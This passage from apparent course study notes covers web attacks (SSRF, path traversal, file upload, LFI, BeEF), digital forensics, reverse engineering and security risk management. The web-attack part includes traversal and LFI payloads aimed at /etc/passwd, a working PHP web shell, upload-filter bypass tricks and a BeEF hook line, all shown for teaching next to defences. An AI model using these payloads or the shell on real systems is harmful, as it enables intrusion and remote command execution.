+- **Access cloud metadata services** (AWS, Azure, GCP)
+
+### SSRF Attack Flow:
+1. Attacker identifies functionality that fetches remote resources
+2. Attacker crafts malicious URL pointing to internal service
+3. Server makes request to internal service on attacker's behalf
+4. Internal service response returned to attacker
+
+### SSRF Defense Mechanisms
+
+#### Network Layer:
+- **Network segmentation** for remote resource access
+- **Deny-by-default firewall policies**
+- **Block internal IP ranges** (10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12)
+
+#### Application Layer:
+- **Input validation** and sanitization
+- **URL whitelist** (positive allow list)
+- **Disable HTTP redirections**
+- **Don't return raw responses** to clients
+
+---
+
+## Directory Traversal and Forced Browsing
+
+### Directory Traversal (Path Traversal)
+- **Definition**: Accessing files outside intended directory using "../" sequences
+- **Common Targets**: 
+  - `/etc/passwd` (Linux user accounts)
+  - `/etc/shadow` (Linux password hashes)
+  - `C:\Windows\System32\config\SAM` (Windows password hashes)
+
+#### Attack Payloads:
+```
+../../../../etc/passwd
+/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+../../../../etc/passwd%00
+```
+
+### Forced Browsing/Directory Busting
+- **Definition**: Attempting to access files/directories not linked from website
+- **Tools**:
+  - **Dirb**: Command-line directory brute-forcer
+  - **Dirbuster**: GUI tool by OWASP
+  - **Nikto**: Web vulnerability scanner
+  - **Nmap http-enum**: Scripting module
+  - **Burp Intruder**: With directory wordlists
+
+#### Common Tools Usage:
+
+**Dirb Example**:
+```bash
+dirb http://target.com/DVWA
+# Uses /usr/share/dirb/wordlists/common.txt (4,612 entries)
+```
+
+**Dirbuster Setup**:
+- Wordlist: `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
+- Target: `http://target.com/DVWA`
+- Method: GET requests with HEAD detection
+
+---
+
+## File Upload Vulnerabilities
+
+### Unvalidated File Uploads
+- **Risk**: Uploading executable files (PHP, JSP, ASPX) that can be executed by server
+- **Impact**: Remote code execution, web shell deployment
+
+#### Web Shell Example (PHP):
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if($_GET['cmd']) {
+    system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
+</html>
+```
+
+#### Defense Bypass Techniques:
+- **Content-Type spoofing**: Change MIME type in request
+- **File extension manipulation**: Use double extensions (.php.jpg)
+- **Null byte injection**: filename.php%00.jpg
+
+### Local File Inclusion (LFI)
+- **Definition**: Including local files on server that shouldn't be directly accessible
+- **Common in**: Modular web applications using include/require functions
+
+#### Example Vulnerable Code:
+```php
+$page = $_GET['page'];
+include($page . '.php');
+```
+
+#### Attack Examples:
+```
+page=../../../../etc/passwd
+page=....//....//....//etc/passwd
+page=/etc/passwd%00
+```
+
+---
+
+## BeEF XSS Framework (Optional)
+
+### Browser Exploitation Framework
+- **Purpose**: Advanced XSS exploitation and browser attacks
+- **Installation**: `sudo apt install beef-xss`
+- **Access**: `http://localhost:3000/ui/panel`
+
+#### Hook Injection:
+```html
+<script src="http://localhost:3000/hook.js"></script>
+```
+
+#### Attack Modules:
+- **Cookie theft**
+- **Screenshot capture**
+- **Keylogger**
+- **Social engineering attacks**
+- **Browser exploitation**
+
+---
+
+## Defense Summary
+
+### General Security Principles
+
+#### Input Validation:
+- **Sanitize all user input**
+- **Use positive validation** (whitelist approach)
+- **Validate on server-side** (never trust client-side validation)
+
+#### Output Encoding:
+- **HTML entity encoding** for web content
+- **URL encoding** for URL parameters
+- **JavaScript encoding** for JavaScript contexts
+
+#### Cookie Security:
+```
+Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=strict
+```
+
+#### Content Security Policy:
+```
+Content-Security-Policy: script-src 'self'; object-src 'none';
+```
+
+### Attack-Specific Defenses
+
+| Attack Type | Primary Defense | Secondary Defense |
+|-------------|----------------|-------------------|
+| XSS | HTML sanitization | CSP, HttpOnly cookies |
+| CSRF | CSRF tokens | SameSite cookies, Referrer validation |
+| SSRF | URL whitelist | Network segmentation |
+| Directory Traversal | Input validation | Filesystem permissions |
+| File Upload | File type validation | Separate upload directory |
+
+---
+
+## Key Exam Points
+
+### Critical Concepts:
+1. **XSS execution context**: Understand where JavaScript runs and what it can access
+2. **CSRF vs XSS**: Know the difference between client-side and server-side effects
+3. **Same-origin policy**: How browsers isolate different websites
+4. **Cookie security flags**: HttpOnly, Secure, SameSite implications
+5. **Defense in depth**: Multiple layers of security controls
+
+### Common Attack Vectors:
+- User input fields (forms, URL parameters)
+- File upload functionality
+- URL/path parameters
+- HTTP headers
+- Cookie values
+
+### Testing Methodology:
+1. **Identify input vectors**
+2. **Test for injection flaws**
+3. **Verify execution context**
+4. **Assess impact and exploitability**
+5. **Document findings and remediation**
+
+---
+
+# 0x0A Digital Forensics and Reverse Engineering
+
+## Table of Contents
+1. [Digital Forensics and Incident Response (DFIR)](#digital-forensics-and-incident-response-dfir)
+2. [Network and File Forensics](#network-and-file-forensics)
+3. [Steganography and Steganalysis](#steganography-and-steganalysis)
+4. [Reverse Engineering](#reverse-engineering)
+5. [Assembly Language and x86 Architecture](#assembly-language-and-x86-architecture)
+6. [Static and Dynamic Analysis](#static-and-dynamic-analysis)
+7. [Tools and Practical Applications](#tools-and-practical-applications)
+
+---
+
+## Digital Forensics and Incident Response (DFIR)
+
+### Definition and Scope
+**Digital Forensics and Incident Response (DFIR)** is a field within cybersecurity that focuses on:
+- **Identification** of cyberattacks
+- **Investigation** of security incidents
+- **Remediation** of cybersecurity threats
+
+DFIR has become a central cyber capability for organizations due to the proliferation of endpoints and escalation of cybersecurity attacks.
+
+### Cyber Incident Response Team (CIRT)
+- Also known as "Computer Incident Response Team"
+- Responsible for responding to:
+  - Security breaches
+  - Viruses
+  - Other potentially catastrophic incidents
+- Digital forensics provides necessary information and evidence for the response team
+
+### Forensics Definition
+**Forensics**: The application of scientific principles to evidence to test hypotheses or apply other scientific tests in the process of investigation.
+
+*Reference: NIST SP-800-86, Guide to Integrating Forensic Techniques Into Incident Response (Pg. 15)*
+
+### Phases of the Forensics Process (NIST 800-86)
+
+1. **Collection**
+   - Gathering relevant digital evidence
+   - Preserving chain of custody
+
+2. **Examination**
+   - Processing collected data
+   - Making data visible and accessible
+
+3. **Analysis**
+   - Drawing conclusions from examined data
+   - Determining significance of evidence
+
+4. **Reporting**
+   - Documenting findings and conclusions
+   - Presenting results to stakeholders
+
+---
+
+## Forensic Areas of Practice
+
+Digital forensics encompasses much more than examining hard drives:
+
+### Core Areas
+- **File System Forensics**: Analysis of file systems and storage devices
+- **Malware Analysis**: Examining malicious software
+- **Memory Forensics**: Analysis of system memory (RAM)
+- **Network Forensics**: Investigation of network traffic and communications
+- **Cloud Forensics**: Digital investigation in cloud environments
+- **Mobile Forensics**: Analysis of mobile devices and applications
+- **Log Analysis**: Examination of system and application logs
+- **IoT Forensics**: Investigation of Internet of Things devices
+
+---
+
+## Network and File Forensics
+
+### Network Forensics Fundamentals
+
+**Packet Traces vs Network Logs:**
+- **Packet traces**: Contain all information being sent across a network, including:
+  - Source and destination machines
+  - Protocol being used
+  - Actual data being sent
+- **Network logs**: Records of network events that tell you something happened but don't contain the actual data
+
+### Network Forensics - Capturing Packets
+
+Network traffic is stored in **PCAP files** (Packet capture) using tools like:
+- tcpdump
+- Wireshark (both based on libpcap)
+
+**Capture Methods:**
+1. **Network Tap**: Device placed between two networked devices that captures traffic flowing between them
+2. **Port Mirroring**: Sends "copies" of packets flowing through a network switch to a specified location
+3. **Wireless Sniffing**: Listens over a wireless network for traffic and captures packets
+
+### Packet Analysis
+- Use packet analyzers like **Wireshark** to dive into packets and identify clues
+- **Key Challenge**: Packets of interest are usually in an ocean of unrelated traffic
+- **Solution**: Analysis triage and filtering the data is crucial
+
+### File Forensics Tools
+
+**Basic Commands:**
+```bash
+# File format identification
+file screenshot.png
+
+# File carving - manually extract sub-section
+dd if=./file_with_a_file_in_it.xxx of=./extracted_file.xxx bs=1 skip=1335205 count=40668937
+
+# Search for plaintext within a file
+strings -o screenshot.png
+
+# Search for binary/hex/encoded strings
+hexdump -n50 -e'"0x%08x "' screenshot.png
+
+# Metadata in image files
+exiftool screenshot.png
+```
+
+---
+
+## Logs for Digital Forensics
+
+### Types of Logs
+
+1. **System Logs**
+   - Capture system events, errors, and activities related to the operating system
+
+2. **Application Logs**
+   - Track user activities and errors specific to applications
+
+3. **Security Device Logs**
+   - Record events from devices designed to protect the network (firewalls, IDS)
+
+4. **Authentication Logs**
+   - Document login attempts and statuses, including successful and failed attempts
+
+5. **Network Device Logs**
+   - Include logs from routers and switches detailing system operations and traffic flows
+
+6. **Audit Logs**
+   - Keep records of changes made within the system, especially configuration changes
+
+---
+
+## Steganography and Steganalysis
+
+### Steganography Definition
+**Steganography**: The art and science of communicating in a way that hides the existence of a message.
+
+**Key Characteristics:**
+- Signal or pattern imposed on content
+- Persistent under transmission
+- **Not encryption** - original image/file remains intact
+- **Not fingerprinting** - doesn't leave separate file describing contents
+
+### Motivation for Steganography
+
+**Legitimate Uses:**
+- Industry's desire to protect copyrighted digital work
+- Embed author ID or detect counterfeit/unauthorized presentation
+
+**Malicious Uses:**
+- Covert way to distribute malware (embed in JPEG files)
+- Covert way to exfiltrate data (upload harmless images with embedded data)
+- Network steganography
+
+### Types of Steganography
+
+#### Text Steganography
+- **Text lines shifted up/down** (40 lines text → 2^40 codes)
+- **Word space coding**
+- **Character encoding** - minor changes to shapes of characters
+- Works only on "images" of text (PDF, PostScript)
+
+#### Image Steganography
+Images are popular "cover text" as they tolerate unnoticeable data loss.
+
+**Spatial Domain:**
+- **Bit setting (LSB)**: Least Significant Bit modification
+- **Color separation**: Using specific color channels
+
+**Frequency Domain:**
+- Apply FFT/DCT transform first
+- Embed signal in select frequency bands
+- Alter least perceptible bits to avoid detection
+- **Warning**: These bits are also targeted by lossy compression (JPEG)
+
+### LSB (Least Significant Bit) Steganography
+
+In 24-bit color images:
+- Each pixel = 24 RGB bits (8 bits each for Red, Green, Blue)
+- LSB method uses the least significant bit of each color channel
+- Provides ability to embed approximately 1/8 data size of original image
+
+**Example LSB Encoding:**
+```
+R = 11011010  →  Value to encode: 11011011 (Hidden Bit 0)
+                 11011010 (Hidden Bit 0)
+G = 10010110  →  10010111 (Hidden Bit 1)
+                 10010110 (Hidden Bit 0)
+B = 10010100  →  10010101 (Hidden Bit 1)
+                 10010100 (Hidden Bit 0)
+```
+
+### Steganalysis
+**Steganalysis**: The art of discovering and rendering covert steganography messages.
+
+**Detection Methods:**
+- Analysis of carrier file for discernible changes in:
+  - File size
+  - Statistics
+  - Color variations
+  - Loss of resolution
+  - Other distortions visible to human eye
+- Requires knowledge of what the original carrier should look like
+
+---
+
+## Reverse Engineering
+
+### Definition and Purpose
+**Reverse Engineering**: A process where a product, device, system, or software is deconstructed to understand its workings in detail, often with the goal of learning from or improving upon it.
+
+**Applications:**
+- **Vulnerability Discovery**: Finding security flaws
+- **Malware Analysis**: Understanding malicious software behavior
+
+### Legal Aspects (Australia)
+Reverse engineering legality is governed by copyright laws.
+
+**Legal in Australia for:**
+- Interoperability purposes
+- Error correction
+- Security testing - malware, vulnerability analysis and research
+
+**Illegal Activities:**
+- Reverse engineering competing products to sell them
+- Cracking copy protections
+- Distributing cracks/registrations for copyrighted software
+- Gaining unauthorized access to any computer
+
+### Learning Reverse Engineering
+Similar to learning a new language (assembly), requires understanding:
+
+**Language Elements → Assembly Elements**
+- **Vocabulary** → **Instructions**
+- **Grammar** → **Addressing Modes/ABI Conventions**
+- **Idioms/Expressions** → **Compiler Patterns/Optimizations**
+
+---
+
+## Assembly Language and x86 Architecture
+
+### Assembly Language Basics
+- **Lowest-level programming language** readable by humans
+- **Intermediary step** between higher-level code (C) and machine code (binary)
+- **Nearly 1:1 correspondence** between assembly instructions and processor instructions
+- **Multiple architectures**: ARM, MIPS, x86, SPARC, etc.
+
+### x86 (32-bit) Architecture
+
+#### Special Registers
+- **EIP (Extended Instruction Pointer)**: Points to the current instruction
+- **ESP (Extended Stack Pointer)**: Points to the "bottom" of stack
+- **EBP (Extended Base Pointer)**: Points 4 bytes below the return pointer, used for referencing address of the previous frame
+
+#### Intel vs AT&T Syntax
+
+**Intel Syntax** (used in this course):
+```assembly
+mov eax, 0xca                    ; <instruction> <destination>, <operand(s)>
+add DWORD PTR [ebp+0x8], 0x5     ; SIZE PTR [addr + offset] for value at address
+```
+
+**AT&T Syntax:**
+```assembly
+movl $0xca, %eax                 ; <instruction> <operand(s)>, <destination>
+addl $0x5, -0x8(%ebp)           ; $ for immediate, % for registers, -offset(addr)
+```
+
+### Important x86 Instructions
+
+#### Mathematical Instructions
+```assembly
+add eax, 0x5        ; Add 0x5 to eax
+sub eax, 0x5        ; Subtract 0x5 from eax
+mul eax, edx        ; Multiplication - lower 32 bits in EAX, upper 32 bits in EDX
+div eax, edx        ; Division - quotient in eax, remainder in edx
+```
+
+#### Comparison/Assignment Instructions
+```assembly
+cmp eax, 0x10                ; Compare - subtracts 0x10 from eax, sets flags
+mov eax, edx                 ; Move contents of edx into eax
+mov eax, DWORD PTR [edx]     ; Move value at memory location edx into eax
+lea eax, [ebx+4*edx]         ; Load effective address - gets pointer to address
+```
+
+#### Calling/Conditional Instructions
+```assembly
+call 0x8004bc       ; Push return address onto stack, call function
+ret                 ; Pop return address and jump to it
+jmp 0x8004bc        ; Unconditional jump
+jl, jle, jge, jg, je ; Conditional jumps (less, less/equal, greater/equal, greater, equal)
+```
+
+### Function Prologue and Epilogue
+
+**Standard Prologue:**
+```assembly
+lea ecx, [esp+0x4]          ; Load address of esp+4 into ecx
+and esp, 0xfffffff0         ; Align stack frame to 16-byte boundary
+push DWORD PTR [ecx-0x4]    ; Push previous esp onto stack
+push ebp                    ; Save previous frame base pointer
+mov ebp, esp                ; Set new frame base pointer
+push ecx                    ; Save ecx
+sub esp, 0x14               ; Allocate 20 bytes for local storage
+```
+
+**Standard Epilogue:**
+```assembly
+mov ecx, DWORD PTR [ebp-0x4]    ; Restore saved values
+leave                           ; Restore previous frame
+lea esp, [ecx-0x4]             ; Restore original esp
+ret                            ; Return to caller
+```
+
+---
+
+## Static and Dynamic Analysis
+
+### Static Analysis
+**Definition**: Examining code without executing it
+
+**Methods:**
+- Read disassembly code
+- Search for strings
+- Analyze file structure
+- Examine imports/exports
+
+**Tools:**
+```bash
+file test1                    # Identify file type
+strings test1                 # Extract readable strings
+```
+
+### Dynamic Analysis
+**Definition**: Running the software and observing its behavior
+
+**Methods:**
+- Debug the code
+- Step through execution
+- Monitor system calls
+- Analyze runtime behavior
+- Trace code execution
+
+**Advantages:**
+- Fast results
+- More accurate than static analysis
+- Can observe actual behavior
+
+---
+
+## Tools and Practical Applications
+
+### Wireshark for Network Analysis
+
+**Key Features:**
+- Packet capture and analysis
+- Protocol decoding
+- Stream following
+- Object extraction
+
+**Common Tasks:**
+1. **Extract files from HTTP streams**: File → Export Objects → HTTP
+2. **Follow TCP streams**: Right-click packet → Follow → TCP Stream
+3. **Filter traffic**: Use display filters to focus on relevant packets
+
+### File Analysis Tools
+
+**Binwalk**: Analyze embedded files
+```bash
+binwalk cape.png              # Detect embedded files
+```
+
+**DD Command**: Extract specific portions
+```bash
+dd if=cape.png of=tmp.pdf skip=59580 bs=1    # Extract PDF from image
+```
+
+**Scalpel**: Automated file carving
+- Configure `/etc/scalpel/scalpel.conf` for file types
+- Run: `scalpel cape.png -o scalpel`
+
+### Steganography Tools
+
+**StegOnline**: Web-based steganography analysis
+- Upload suspicious images
+- Browse bit planes
+- Extract embedded data
+
+**Stegsolve**: Java application for steganography
+```bash
+wget http://www.caesum.com/handbook/Stegsolve.jar
+chmod +x stegsolve.jar
+java -jar stegsolve.jar
+```
+
+### Simple File Hiding Technique
+**Concatenation Method:**
+```bash
+cat File_B >> File_A          # Append File_B to end of File_A
+```
+
+---
+
+## Reverse Engineering Tools
+
+### Ghidra (NSA Tool)
+**Features:**
+- Java-based interactive reverse engineering tool
+- Static analysis capabilities
+- Runs on Mac, Linux, and Windows
+- Open source (released March 2019)
+- 1.2M+ lines of code
+
+**Main Components:**
+1. **Program Trees**: File structure view
+2. **Symbol Tree**: Functions, imports, exports
+3. **Data Type Manager**: Type definitions
+4. **Listing (Disassembler)**: Assembly code view
+5. **Decompiler**: High-level C-like code
+6. **Control Flow Graph**: Visual program flow
+
+### Other Reverse Engineering Tools
+
+**Disassemblers:**
+- **IDA Pro**: Industry standard (commercial)
+- **Binary Ninja**: Modern disassembler
+- **Radare2**: Open source framework
+
+**Hex Editors:**
+- **HIEW**: Windows hex editor
+- **HT Editor**: Cross-platform
+
+**Debuggers:**
+- **OllyDbg**: Windows debugger
+- **GDB**: GNU debugger
+- **x64dbg**: Modern Windows debugger
+
+---
+
+## Practical Workshop Exercises
+
+### Network Forensics Exercise
+1. **Download PCAP file**: http.pcap
+2. **Open in Wireshark**
+3. **Extract HTTP objects**: File → Export Objects → HTTP
+4. **Save extracted files** for analysis
+
+### FTP Stream Analysis
+1. **Download FTP PCAP**: ftp.pcap
+2. **Find FTP data stream**
+3. **Right-click and Follow TCP Stream**
+4. **Save raw data**: Choose "Raw" in show options
+5. **Analyze with file command**:
+   ```bash
+   file ftpfile
+   # Output: PC bitmap, Windows 3.x format, 111 x -152 x 32
+   ```
+
+### Steganography Exercises
+
+#### PDF in Image Extraction
+1. **Download**: cape-1-1.png
+2. **Check file type**: `file cape.png` (reports as PNG)
+3. **Check for hidden data**: `strings cape.png | more`
+4. **Use binwalk**: `binwalk cape.png`
+5. **Extract PDF**: `dd if=cape.png of=tmp.pdf skip=59580 bs=1`
+
+#### LSB Steganography
+1. **Download test image** with hidden message
+2. **Upload to StegOnline**: https://georgeom.net/StegOnline/upload
+3. **Browse bit planes**: Look through all 24 bit planes
+4. **Find hidden message**: Usually in LSB of Blue channel
+
+### Reverse Engineering Exercise
+
+#### CrackMes Challenge
+1. **Download rev50** from CrackMes.one
+2. **Password**: crackmes.one
+3. **Goal**: Find password through binary analysis
+
+#### Using Ghidra
+1. **Install Ghidra**: `sudo apt install ghidra`
+2. **Create new project**: Non-shared project named "crackme1"
+3. **Import binary**: Drag-and-drop or File → Import File
+4. **Start analysis**: Accept defaults and click OK
+5. **Navigate to main function**: Click in Symbol Tree
+6. **Analyze decompiled code**: Look for password validation logic
+
+**Solution Pattern**: Often involves:
+- Length check (e.g., 10 characters)
+- Specific character checks (e.g., 5th character must be '@')
+- Mathematical operations or comparisons
+
+---
+
+## CTF vs Real World Forensics
+
+### CTF Forensics Focus
+- File format analysis
+- Steganography challenges
+- Memory dump analysis
+- Network packet capture analysis
+- **Goal**: Extract hidden information from static data files
+
+### Real World Forensics Focus
+- Find indirect evidence of maliciousness
+- Trace attacker activities on systems
+- Identify "insider threat" behavior
+- Analyze logs, memory, registries, filesystems, network logs
+- Examine metadata
+- **Goal**: Know where to find incriminating clues
+
+---
+
+## Key Exam Points
+
+### Digital Forensics Essentials
+1. **Four phases**: Collection → Examination → Analysis → Reporting
+2. **Difference**: Packet traces contain actual data; network logs are just records
+3. **File carving**: Extract files embedded in other files
+4. **Chain of custody**: Maintain evidence integrity
+
+### Steganography Key Concepts
+1. **Definition**: Hide existence of message, not just content
+2. **LSB method**: Most common for images (1/8 storage capacity)
+3. **Detection**: Look for statistical anomalies, file size changes
+4. **Tools**: StegOnline, Stegsolve for analysis
+
+### Reverse Engineering Fundamentals
+1. **Legal boundaries**: Security research vs. commercial piracy
+2. **Static vs. Dynamic**: Code analysis vs. runtime observation
+3. **Assembly basics**: x86 instruction set, calling conventions
+4. **Tools**: Ghidra for static analysis, debuggers for dynamic
+
+### Network Forensics Priorities
+1. **Filtering is crucial**: Find relevant packets in traffic ocean
+2. **Protocol knowledge**: Understand HTTP, FTP, TCP/IP
+3. **Stream following**: Reconstruct communications
+4. **Evidence extraction**: Pull files, passwords, data from streams
+
+---
+
+# Workshop 0x0B Security Engineering Management and Frameworks
+
+## Includes Log Analysis & SIEM Exploration Using Splunk
+### Manual Log Analysis
+
+#### Overview
+- **Blue Team**: Operational security team proactively looking for signs of attacks and intrusions
+- Traditional approach: Using syslog logs with grep/sed/awk commands
+- Problems: Time-consuming as log sizes grow to gigabytes/terabytes
+- Modern approach: Use SIEM (Security Information and Event Management System)
+
+#### Apache Log Analysis
+**Apache Combined Log Format:**
+```
+%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-agent}i"
+```
+
+**Field Definitions:**
+- `%h` = IP address of client (remote host)
+- `%l` = RFC 1413 identity of client
+- `%u` = userid of person requesting document
+- `%t` = Time server finished processing request
+- `%r` = Request line from client in double quotes
+- `%>s` = Status code server sends back to client
+- `%b` = Size of object returned to client
+
+**Example Commands:**
+```bash
+# View User Agent statistics
+awk -F\" '{print $6}' access.log | uniq -c | sort -nr | head -n 10
+
+# Find IP addresses using dirbuster
+grep -i "dirbuster" /var/log/apache2/access.log | awk '{print $1}' | uniq -c
+
+# Check response codes for dirbuster scans
+grep -i "dirbuster" /var/log/apache2/access.log | awk '{print $9}' | uniq -c
+```
+
+### SIEM Systems
+
+#### What is a SIEM?
+- **Definition**: Security Information and Event Management System
+- **Examples**: Splunk, Logstash, Huntsman
+- **Function**: Create Google-style indexes for fast multi-source searches
+- **Benefit**: Vastly speed up complex queries across large datasets
+
+#### Splunk Basics
+- **Description**: "Google for machine logs"
+- **Data Sources**: Network traffic, security monitoring, OS/application logs, security alerts
+- **Index Prefix**: All searches should start with `index=botsv1` for competition dataset
+
+**Important Concepts:**
+- **Source**: Location from which data is retrieved
+- **Sourcetype**: Type of data being indexed
+
+**Common Sourcetypes:**
+- `WinEventLog:*` - Windows Event Logs (Application, Security, System)
+- `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` - Sysmon monitoring logs
+- `fgt_*` - Fortigate firewall logs
+- `stream:*` - Network traffic logs split by protocol
+- `suricata` - IDS alerts from Suricata
+
+---
+
+## Security Engineering, Operations, and Management
+
+### What is Security Engineering?
+
+**Definition (Ross Anderson):** "Security engineering is about building systems to remain dependable in the face of malice, error, or mischance."
+
+#### Why Security Engineering is Important
+**Critical Systems Examples:**
+- Nuclear safety control systems
+- Medical equipment
+- Automatic driving cars
+- ATM machines
+- Aeroplane controls
+- Banking systems
+
+**Key Points:**
+- Failure can lead to death, injury, or serious harm
+- Pentesting discovers weaknesses, but secure design from the start is better
+- **Cost principle**: Cheaper to address security issues early in development cycle
+
+### Security Engineering Frameworks and Standards
+
+#### Major Frameworks:
+- **NIST EP-ITS (SP 800-27)**: 33 Principles (Withdrawn 2017)
+- **NIST SP800-160**: 32 "Security Design Principles" (Appendix F)
+- **OWASP**: "Security by Design Principles" - 10 Principles
+
+**Note**: No de-facto list of principles = use rules of thumb
+
+### 10 Security Principles (Modified OWASP List)
+
+#### 1. Keep Security Simple
+- More complex systems = more likely security flaws exist
+- Keep controls atomic
+
+#### 2. Make Security Usable
+- **Before**: Complex certificate warnings, complicated password requirements
+- **Now**: User-friendly security warnings, better UX design
+- **Problem**: Overly complex security leads to workarounds (passwords on sticky notes)
+
+#### 3. Least Privilege
+- **Users**: Limit damage by limiting user rights (no local administrator)
+- **Programs**: Running as non-root limits damage after compromise
+- **Principle**: Grant minimum access necessary for function
+
+#### 4. Segregation of Duties
+- Reduce single party ability to perpetrate fraud
+- **Two-man rule**: Nuclear launch requires two people
+- **Examples**:
+  - Person A: Update vendor bank account
+  - Person B: Approve payment  
+  - Person C: Transfer money
+- **Development**: Developer cannot directly push to production
+
+#### 5. Defence in Depth
+**Multiple Security Layers:**
+- System patched
+- Secure coding
+- Services running as non-root
+- Web server in DMZ
+- Firewall and IDS in place
+
+**Key Points:**
+- Prevent AND detect
+- 100% prevention not possible or economical
+- Use different vendors for each layer (anti-malware at network, email, workstation, file storage)
+
+#### 6. Zero Trust
+**Don't trust anything by default:**
+- User inputs = validate
+- Third-party libraries = security review and pentests
+- Third-party contractors = background check
+- Employees = background check + monitoring
+- Applications = host-based firewall + monitoring
+
+**Modern Context:**
+- No perimeter (Cloud Services and BYOD)
+- Microsegmentation
+- Fine-grained audit and adaptive security
+
+#### 7. Security by Default
+**Examples:**
+- Turn OFF all insecure services
+- SELinux enabled out of the box
+- No default passwords (or require change on first logon)
+- Default deny rule on firewall
+
+#### 8. Fail Securely
+**Firewall Example:**
+- ✅ **Correct**: Default deny with specific allow rules
+- ❌ **Wrong**: Allow everything by default
+
+**Code Example:**
+```java
+// Correct approach
+isAdmin = false;
+try {
+    codeWhichMayFail();
+    isAdmin = isUserInRole("Administrator");
+} catch (Exception ex) {
+    log.write(ex.toString());
+}
+
+// Wrong approach  
+isAdmin = true;
+try {
+    codeWhichMayFail();
+    isAdmin = isUserInRole("Administrator");
+} catch (Exception ex) {
+    log.write(ex.toString());
+}
+```
+
+#### 9. Avoid Security by Obscurity
+**Kerckhoff's Principle:**
+- Protect the key, but make encryption protocol open
+- Running SSH on non-standard port (2211) is OK, but don't rely on hackers NOT finding it
+- Obfuscating code is not real security
+- Certificate authentication on standard port is much better
+
+#### 10. Risk-Informed
+- Does it make economic sense for the attacker?
+- **Don't spend $10,000 to protect a $1,000 asset**
+- Balance spending on security vs. value of assets
+
+---
+
+## Information Security and Risk Management
+
+### What is Information Security Management?
+
+**Definition**: Protect the security of information assets (information itself + systems that process/transmit/store information) by efficiently deploying security controls that prevent/detect threats.
+
+**Security Components:**
+- **Confidentiality**: Information only accessible to authorized users
+- **Integrity**: Information remains accurate and unaltered
+- **Availability**: Information accessible when needed
+- **Accountability**: Non-repudiation, audit trails
+
+**Security Controls Examples**: Access control, disaster recovery, penetration testing
+
+### Risk Management
+
+#### What is Risk?
+**Formula**: Risk = Threat + Vulnerability
+
+**Examples:**
+- Computer worm + unpatched OS = Risk of compromised host
+- Laptop theft + unencrypted disk = Risk of data breach  
+- Storm + underground data centre = Risk of flooded data centre
+
+**NIST SP 800-30 Definition**: "Risk is a function of the likelihood of a given threat-source's exercising a particular potential vulnerability, and the resulting impact of that adverse event on the organisation."
+
+#### Risk Measurement
+
+**Qualitative Analysis:**
+- Function of (IMPACT, LIKELIHOOD)
+- **RISK = IMPACT × LIKELIHOOD**
+
+**Risk Matrix Example:**
+| Likelihood | Insignificant (1) | Minor (2) | Moderate (3) | Major (4) | Extreme (5) |
+|------------|-------------------|-----------|--------------|-----------|-------------|
+| Almost Certain (A) | M | M | H | E | E |
+| Likely (B) | L | M | H | H | E |
+| Possible (C) | L | M | M | H | H |
+| Unlikely (D) | L | L | M | M | H |
+| Rare (E) | L | L | L | L | M |
+
+**Likelihood Definitions:**
+- **A - Almost Certain**: Highly likely to happen, possibly frequently
+- **B - Likely**: Will probably happen, but not persistent
+- **C - Possible**: May happen occasionally
+- **D - Unlikely**: Not expected to happen, but possible
+- **E - Rare**: Very unlikely this will ever happen
+
+**Risk Categories:**
+- **Extreme (E)**: Immediate attention & response needed
+- **High (H)**: Risk to be given appropriate attention & demonstrably managed
+- **Medium (M)**: Assess risk; determine if current controls adequate
+- **Low (L)**: Manage by routine procedures; monitor & review locally
+
+#### Quantitative Risk Analysis
+
+**Key Metrics:**
+- **Asset Value (AV)**: $ value of information asset
+- **Exposure Factor (EF)**: % of asset loss caused by threat
+- **Single Loss Expectancy (SLE)**: AV × EF
+- **Annualised Rate of Occurrence (ARO)**: Frequency per year
+- **Annualised Loss Expectancy (ALE)**: SLE × ARO
+
+**Example:**
+- Research data worth $1M (AV = $1M)
+- Ransomware renders 50% useless (EF = 0.5)
+- SLE = $1M × 0.5 = $500K
+- Attack once every two years (ARO = 0.5)
+- ALE = $500K × 0.5 = $250K
+
+#### Risk Treatment Options
+
+**4 Choices:**
+1. **Accept**: Define risk appetite of organisation
+2. **Transfer**: Buy insurance, outsource
+3. **Mitigate**: Implement controls
+4. **Avoid**: Give up on the activity
+
+#### Types of Controls
+
+**By Implementation:**
+- **Administrative**: Policies, guidelines
+- **Physical**: Locks and walls
+- **Technical**: Software design, configurations
+
+**By Function:**
+- **Preventive**: Firewalls
+- **Detective**: Intrusion Detection
+- **Corrective**: Incident response plan
+
+**Control Examples Quiz:**
+- HR Manager approval for HR system access: Administrative, Preventive
+- Minimum password length: Technical, Preventive
+- IDS: Technical, Detective
+- IPS: Technical, Preventive
+- Antivirus: Technical, Preventive/Detective
+- Secure coding practices: Administrative, Preventive
+- Security patches: Technical, Preventive
+- Incident response plan: Administrative, Corrective
+- Locked data centre door: Physical, Preventive
+- Surveillance camera: Physical, Detective
+
+---
+
+## Security Operations Center (SOC)
+
+### Definition
+**Security Operations**: Organised, coordinated and deliberate set of security activities to prepare, monitor and respond to cyber security incidents. Often runs 24/7.
+
+### SOC Cycle
+
+#### 1. Assess
+**Be ready for the attack!**
+- Network scanning
+- Asset enumeration
+- Vulnerability scanning (Nessus, OpenVAS)
+- Configuration reviews
+- Firewall rules review
+- Penetration Testing / Red Teaming / Blue Teaming
+
+#### 2. Intelligence
+**Know what's inside and what's out there**
+- New threats
+- Incidents at other organisations
+- Phishing campaigns going around
+- Latest attack techniques
+- New vulnerabilities and vendor patches
+- New IOCs (Indicators of Compromise)
+
+#### 3. Threat Hunting
+**Actively searching for signs of attack**
+- Use intelligence data + highly skilled cybersecurity analysts
+- **Key Questions**:
+  - How would the bad guys attack?
+  - What would we see in logs if they were attacking?
+  - How would we know if system has been compromised?
+  - What would we see in logs if someone is inside network?
+- **Goal**: Find incidents as early as possible
+
+#### 4. Detect
+**Ear to the ground - Minimise MTTD (Mean Time To Detect)**
+- Set up alerts in SIEMs based on IOCs
+- Tripwire
+- Antimalware
+- Commercial IDS/IPS (Snort, Suricata, Palo Alto)
